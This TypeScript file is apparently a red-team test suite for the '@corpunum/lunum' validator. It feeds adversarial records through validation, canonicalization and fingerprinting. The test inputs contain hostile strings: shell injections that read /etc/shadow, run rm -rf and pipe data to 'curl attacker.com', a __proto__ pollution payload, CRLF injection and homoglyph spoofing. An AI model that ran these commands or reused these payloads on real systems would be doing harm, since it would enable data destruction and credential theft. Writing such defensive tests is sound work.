import { validateSem, canonicalizeSem, fingerprintSem } from '@corpunum/lunum';
import type { LunumSem } from '@corpunum/lunum';

export interface ProductFlowTestCase {
  id: string;
  category:
    | 'cli-injection'
    | 'jsonl-poisoning'
    | 'schema-injection'
    | 'fingerprint-attack'
    | 'unicode-normalization';
  description: string;
  input: unknown;
  expected: 'reject' | 'normalize' | 'pass';
}

export interface ProductFlowTestResult {
  id: string;
  category: string;
  description: string;
  expected: 'reject' | 'normalize' | 'pass';
  actual: 'reject' | 'normalize' | 'error';
  passed: boolean;
  validationOk: boolean;
  validationErrors: string[];
  canonicalSem?: LunumSem | undefined;
  fingerprint?: string | undefined;
  errorMessage?: string | undefined;
}

export interface ProductFlowCategorySummary {
  total: number;
  passed: number;
  failed: number;
}

export interface ProductFlowSummary {
  timestamp: string;
  totalTests: number;
  passCount: number;
  failCount: number;
  byCategory: Record<string, ProductFlowCategorySummary>;
  results: ProductFlowTestResult[];
}

export const PRODUCT_FLOW_TEST_CASES: ProductFlowTestCase[] = [
  {
    id: 'CLI-001',
    category: 'cli-injection',
    description: 'Malicious --flag value in world field',
    input: {
      schema: 'lunum-sem/0.1-draft',
      world: '--rm-rf /etc/passwd',
      kind: 'query',
      clauses: [{ predicate: 'lookup', roles: { target: 'user' } }]
    },
    expected: 'normalize'
  },
  {
    id: 'CLI-002',
    category: 'cli-injection',
    description: 'Shell metacharacters in predicate',
    input: {
      schema: 'lunum-sem/0.1-draft',
      world: 'test',
      kind: 'action',
      clauses: [{ predicate: '$(rm -rf /)', roles: { cmd: '`whoami`; cat /etc/shadow' } }]
    },
    expected: 'normalize'
  },
  {
    id: 'CLI-003',
    category: 'cli-injection',
    description: 'Pipe and redirect operators in role values',
    input: {
      schema: 'lunum-sem/0.1-draft',
      world: 'pipeline',
      kind: 'action',
      clauses: [{ predicate: 'execute', roles: { input: 'data | curl attacker.com > /dev/null' } }]
    },
    expected: 'normalize'
  },

  {
    id: 'JSONL-001',
    category: 'jsonl-poisoning',
    description: 'Null bytes embedded in world field',
    input: {
      schema: 'lunum-sem/0.1-draft',
      world: 'test\x00poisoned',
      kind: 'query',
      clauses: [{ predicate: 'read', roles: {} }]
    },
    expected: 'normalize'
  },
  {
    id: 'JSONL-002',
    category: 'jsonl-poisoning',
    description: 'Carriage return injection in predicate',
    input: {
      schema: 'lunum-sem/0.1-draft',
      world: 'logs',
      kind: 'event',
      clauses: [{ predicate: 'entry\r\n{"injected":true}', roles: { status: 'ok' } }]
    },
    expected: 'normalize'
  },
  {
    id: 'JSONL-003',
    category: 'jsonl-poisoning',
    description: 'Oversized single-line string (>1MB) in role value',
    input: {
      schema: 'lunum-sem/0.1-draft',
      world: 'stress',
      kind: 'data',
      clauses: [{ predicate: 'store', roles: { payload: 'X'.repeat(1_100_000) } }]
    },
    expected: 'normalize'
  },

  {
    id: 'SI-001',
    category: 'schema-injection',
    description: '__proto__ pollution in sem annotations',
    input: {
      schema: 'lunum-sem/0.1-draft',
      world: 'test',
      kind: 'rule',
      clauses: [{ predicate: 'eval', roles: {} }],
      annotations: JSON.parse('{"__proto__": {"isAdmin": true}, "constructor": {"prototype": {"isAdmin": true}}}')
    },
    expected: 'normalize'
  },
  {
    id: 'SI-002',
    category: 'schema-injection',
    description: 'Extra fields attempting to override schema version',
    input: {
      schema: 'lunum-sem/0.1-draft',
      world: 'test',
      kind: 'rule',
      clauses: [{ predicate: 'check', roles: {} }],
      _schema_override: 'lunum-sem/99.0',
      toString: 'hijacked'
    },
    expected: 'normalize'
  },

  {
    id: 'FA-001',
    category: 'fingerprint-attack',
    description: 'Trailing whitespace and BOM designed to evade fingerprint',
    input: {
      schema: 'lunum-sem/0.1-draft',
      world: '﻿finance   ',
      kind: 'query  ',
      clauses: [{ predicate: 'balance\t', roles: { account: 'a1' } }]
    },
    expected: 'normalize'
  },
  {
    id: 'FA-002',
    category: 'fingerprint-attack',
    description: 'Crafted near-collision with swapped role key casing',
    input: {
      schema: 'lunum-sem/0.1-draft',
      world: 'Finance',
      kind: 'Query',
      clauses: [{ predicate: 'Balance', roles: { Account: 'a1' } }]
    },
    expected: 'normalize'
  },

  {
    id: 'UN-001',
    category: 'unicode-normalization',
    description: 'NFD decomposed e-acute vs NFC precomposed in predicate',
    input: {
      schema: 'lunum-sem/0.1-draft',
      world: 'test',
      kind: 'query',
      clauses: [{ predicate: 'resumé', roles: { field: 'café' } }]
    },
    expected: 'normalize'
  },
  {
    id: 'UN-002',
    category: 'unicode-normalization',
    description: 'Homoglyph substitution with Greek omicron for Latin o',
    input: {
      schema: 'lunum-sem/0.1-draft',
      world: 'wοrld',
      kind: 'query',
      clauses: [{ predicate: 'lοgin', roles: { user: 'rοot' } }]
    },
    expected: 'normalize'
  }
];

export function runProductFlowRedTeam(): ProductFlowSummary {
  const results: ProductFlowTestResult[] = [];
  const byCategory: Record<string, ProductFlowCategorySummary> = {};

  for (const tc of PRODUCT_FLOW_TEST_CASES) {
    if (!byCategory[tc.category]) {
      byCategory[tc.category] = { total: 0, passed: 0, failed: 0 };
    }
    const catSummary = byCategory[tc.category]!;
    catSummary.total++;

    const validation = validateSem(tc.input);
    let actual: 'reject' | 'normalize' | 'error';
    let canonicalSem: LunumSem | undefined;
    let fp: string | undefined;
    let errorMessage: string | undefined;

    if (!validation.ok) {
      actual = 'reject';
    } else {
      try {
        canonicalSem = canonicalizeSem(tc.input);
        fp = fingerprintSem(tc.input);
        actual = 'normalize';
      } catch (err: unknown) {
        actual = 'error';
        errorMessage = err instanceof Error ? err.message : String(err);
      }
    }

    let passed = false;
    if (tc.expected === 'reject') {
      passed = actual === 'reject';
    } else if (tc.expected === 'normalize') {
      passed = actual === 'normalize' && canonicalSem != null && fp != null;
    } else {
      passed = actual === 'normalize';
    }

    if (passed) {
      catSummary.passed++;
    } else {
      catSummary.failed++;
    }

    const result: ProductFlowTestResult = {
      id: tc.id,
      category: tc.category,
      description: tc.description,
      expected: tc.expected,
      actual,
      passed,
      validationOk: validation.ok,
      validationErrors: validation.errors,
    };

    if (canonicalSem != null) {
      result.canonicalSem = canonicalSem;
    }
    if (fp != null) {
      result.fingerprint = fp;
    }
    if (errorMessage != null) {
      result.errorMessage = errorMessage;
    }

    results.push(result);
  }

  const passCount = results.filter((r) => r.passed).length;
  const failCount = results.length - passCount;

  return {
    timestamp: new Date().toISOString(),
    totalTests: results.length,
    passCount,
    failCount,
    byCategory,
    results
  };
}
